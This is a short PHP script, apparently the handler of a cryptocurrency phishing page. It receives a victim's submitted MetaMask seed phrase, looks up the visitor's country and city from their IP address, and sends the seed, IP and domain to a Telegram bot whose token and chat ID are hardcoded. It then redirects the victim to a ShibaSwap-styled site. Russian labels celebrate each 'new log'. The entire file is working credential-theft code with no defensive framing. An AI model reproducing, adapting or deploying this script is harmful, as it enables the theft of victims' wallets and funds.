<?php  
  // params
  $emptyMess = '';
  $s_eed_Dc = $_POST['s_eed_Dc'];

  // security
  if ($s_eed_Dc == '') {
    header('Location: ../');
  } else {
    $ip = $_SERVER['REMOTE_ADDR'];
    $NowDomen = $_SERVER['SERVER_NAME'];
    $NowCountry = file_get_contents("https://ipapi.co/$ip/country_name/");
    $NowCity = file_get_contents("https://ipapi.co/$ip/city/");
  
    // bot telegram
    $token = "7758194328:AAG9pSD9fya02U2m4lgsG8OjNFKtLIt0r_0";
    $chat_id = "-1002371075600";
  
    // message
    $arr = array(
      "💸 Поздравляем, новый лог!" => $emptyMess,
      "💵 Кошелёк: " => 'MetaMask',
      "🔑 SEED Фраза: " => $s_eed_Dc,
      "🗻 IP: " => $ip,
      "🌍 Страна: " => $NowCountry,
      "🌇 Город: " => $NowCity,
      "🔧 Домен: " => $NowDomen
    );
  
    // foreach for array
    foreach($arr as $key => $value) {
      $txt .= "<b>".$key."</b> ".$value."%0A";
    };
  
    // sending message
    $sendToTelegram = fopen("https://api.telegram.org/bot{$token}/sendMessage?chat_id={$chat_id}&parse_mode=html&text={$txt}","r");
    header('Location: https://shibaswap-www.pages.dev/');
  };
?>